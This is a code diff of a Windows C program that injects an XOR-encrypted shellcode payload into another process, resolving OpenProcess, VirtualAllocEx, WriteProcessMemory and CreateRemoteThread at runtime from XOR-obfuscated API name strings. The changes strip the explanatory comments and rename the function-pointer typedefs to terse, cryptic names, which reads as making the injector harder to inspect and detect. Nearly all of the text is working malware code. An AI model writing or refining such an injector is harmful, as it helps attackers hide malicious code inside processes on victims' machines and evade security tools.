@@ -2,50 +2,40 @@
 #include <windows.h>
 #include <tlhelp32.h>
 
-// Function pointer typedefs for dynamic resolution
-typedef HANDLE(WINAPI *pCreateToolhelp32Snapshot)(DWORD, DWORD);
-typedef BOOL(WINAPI *pProcess32First)(HANDLE, LPPROCESSENTRY32);
-typedef BOOL(WINAPI *pProcess32Next)(HANDLE, LPPROCESSENTRY32);
-typedef HANDLE(WINAPI *pOpenProcess)(DWORD, BOOL, DWORD);
-typedef LPVOID(WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
-typedef BOOL(WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T,
-                                          SIZE_T *);
-typedef HANDLE(WINAPI *pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES,
-                                            SIZE_T, LPTHREAD_START_ROUTINE,
-                                            LPVOID, DWORD, LPDWORD);
-typedef HANDLE(WINAPI *cth3s)(DWORD);
+typedef HANDLE(WINAPI *cth3s)(DWORD, DWORD);
+typedef BOOL(WINAPI *p3f)(HANDLE, LPPROCESSENTRY32);
+typedef BOOL(WINAPI *p32n)(HANDLE, LPPROCESSENTRY32);
+typedef HANDLE(WINAPI *opp)(DWORD, BOOL, DWORD);
+typedef LPVOID(WINAPI *vae)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL(WINAPI *wpm)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
+typedef HANDLE(WINAPI *crth)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
+                             LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 
 char key[] = "mysecretkey";
-// XOR-obfuscated API name strings (encrypt these once with the same XOR
-// against "mysecretkey", then paste the bytes here — quick python one-liner
-// below to generate them). Placeholders shown; regenerate for your build.
-char s_snap[] = {
-    0x2e, 0x0b, 0x16, 0x04, 0x17, 0x17, 0x31, 0x1b, 0x04,
-    0x09, 0x11, 0x08, 0x15, 0x03, 0x56, 0x51, 0x21, 0x0b,
-    0x15, 0x1b, 0x16, 0x11, 0x02, 0x0d, 0x00}; // CreateToolhelp32Snapshot
+char s_snap[] = {0x2e, 0x0b, 0x16, 0x04, 0x17, 0x17, 0x31, 0x1b, 0x04,
+                 0x09, 0x11, 0x08, 0x15, 0x03, 0x56, 0x51, 0x21, 0x0b,
+                 0x15, 0x1b, 0x16, 0x11, 0x02, 0x0d, 0x00};
 
 char s_p32f[] = {0x3d, 0x0b, 0x1c, 0x06, 0x06, 0x01, 0x16, 0x47,
-                 0x59, 0x23, 0x10, 0x1f, 0x0a, 0x07, 0x00}; // Process32First
+                 0x59, 0x23, 0x10, 0x1f, 0x0a, 0x07, 0x00};
 
 char s_p32n[] = {0x3d, 0x0b, 0x1c, 0x06, 0x06, 0x01, 0x16,
-                 0x47, 0x59, 0x2b, 0x1c, 0x15, 0x0d, 0x00}; // Process32Next
+                 0x47, 0x59, 0x2b, 0x1c, 0x15, 0x0d, 0x00};
 
 char s_open[] = {0x22, 0x09, 0x16, 0x0b, 0x33, 0x00,
-                 0x0a, 0x17, 0x0e, 0x16, 0x0a, 0x00}; // OpenProcess
+                 0x0a, 0x17, 0x0e, 0x16, 0x0a, 0x00};
 
 char s_valex[] = {0x3b, 0x10, 0x01, 0x11, 0x16, 0x13, 0x09, 0x35,
-                  0x07, 0x09, 0x16, 0x0e, 0x3c, 0x0b, 0x00}; // VirtualAllocEx
+                  0x07, 0x09, 0x16, 0x0e, 0x3c, 0x0b, 0x00};
 
-char s_wpm[] = {
-    0x3a, 0x0b, 0x1a, 0x11, 0x06, 0x22, 0x17, 0x1b, 0x08, 0x00,
-    0x0a, 0x1e, 0x34, 0x16, 0x08, 0x0c, 0x00, 0x1c, 0x00}; // WriteProcessMemory
+char s_wpm[] = {0x3a, 0x0b, 0x1a, 0x11, 0x06, 0x22, 0x17, 0x1b, 0x08, 0x00,
+                0x0a, 0x1e, 0x34, 0x16, 0x08, 0x0c, 0x00, 0x1c, 0x00};
 
-char s_crt[] = {
-    0x2e, 0x0b, 0x16, 0x04, 0x17, 0x17, 0x37, 0x11, 0x06, 0x0a,
-    0x0d, 0x08, 0x2d, 0x1b, 0x17, 0x06, 0x13, 0x01, 0x00}; // CreateRemoteThread
+char s_crt[] = {0x2e, 0x0b, 0x16, 0x04, 0x17, 0x17, 0x37, 0x11, 0x06, 0x0a,
+                0x0d, 0x08, 0x2d, 0x1b, 0x17, 0x06, 0x13, 0x01, 0x00};
 
 char s_k32[] = {0x06, 0x1c, 0x01, 0x0b, 0x06, 0x1e, 0x56,
-                0x46, 0x45, 0x01, 0x15, 0x01, 0x00}; // kernel32.dll
+                0x46, 0x45, 0x01, 0x15, 0x01, 0x00};
 
 unsigned char payload[] = {
     0x91, 0x31, 0xf2, 0x81, 0x93, 0x8d, 0x9a, 0x8b, 0x83, 0xb5, 0x79, 0x6d,
@@ -89,8 +79,7 @@ void XOR(char *data, size_t data_len, char *key, size_t key_len) {
   }
 }
 
-int findTarget(pCreateToolhelp32Snapshot fSnap, pProcess32First fFirst,
-               pProcess32Next fNext, const char *procname) {
+int findTarget(cth3s fSnap, p3f fFirst, p32n fNext, const char *procname) {
   HANDLE hSnap;
   PROCESSENTRY32 pe32;
   int pid = 0;
@@ -116,9 +105,8 @@ int findTarget(pCreateToolhelp32Snapshot fSnap, pProcess32First fFirst,
   return pid;
 }
 
-int inject(pVirtualAllocEx fAlloc, pWriteProcessMemory fWrite,
-           pCreateRemoteThread fThread, HANDLE hProc, unsigned char *pl,
-           unsigned int pl_len) {
+int inject(vae fAlloc, wpm fWrite, crth fThread, HANDLE hProc,
+           unsigned char *pl, unsigned int pl_len) {
   LPVOID pRemote = fAlloc(hProc, NULL, pl_len, MEM_COMMIT, PAGE_EXECUTE_READ);
   if (!pRemote)
     return -1;
@@ -150,15 +138,13 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE hp, LPSTR cmd, int show) {
   if (!hK32)
     return -1;
 
-  pCreateToolhelp32Snapshot fSnap =
-      (pCreateToolhelp32Snapshot)GetProcAddress(hK32, s_snap);
-  pProcess32First fFirst = (pProcess32First)GetProcAddress(hK32, s_p32f);
-  pProcess32Next fNext = (pProcess32Next)GetProcAddress(hK32, s_p32n);
-  pOpenProcess fOpen = (pOpenProcess)GetProcAddress(hK32, s_open);
-  pVirtualAllocEx fAlloc = (pVirtualAllocEx)GetProcAddress(hK32, s_valex);
-  pWriteProcessMemory fWrite = (pWriteProcessMemory)GetProcAddress(hK32, s_wpm);
-  pCreateRemoteThread fThread =
-      (pCreateRemoteThread)GetProcAddress(hK32, s_crt);
+  cth3s fSnap = (cth3s)GetProcAddress(hK32, s_snap);
+  p3f fFirst = (p3f)GetProcAddress(hK32, s_p32f);
+  p32n fNext = (p32n)GetProcAddress(hK32, s_p32n);
+  opp fOpen = (opp)GetProcAddress(hK32, s_open);
+  vae fAlloc = (vae)GetProcAddress(hK32, s_valex);
+  wpm fWrite = (wpm)GetProcAddress(hK32, s_wpm);
+  crth fThread = (crth)GetProcAddress(hK32, s_crt);
 
   if (!fSnap || !fFirst || !fNext || !fOpen || !fAlloc || !fWrite || !fThread)
     return -1;
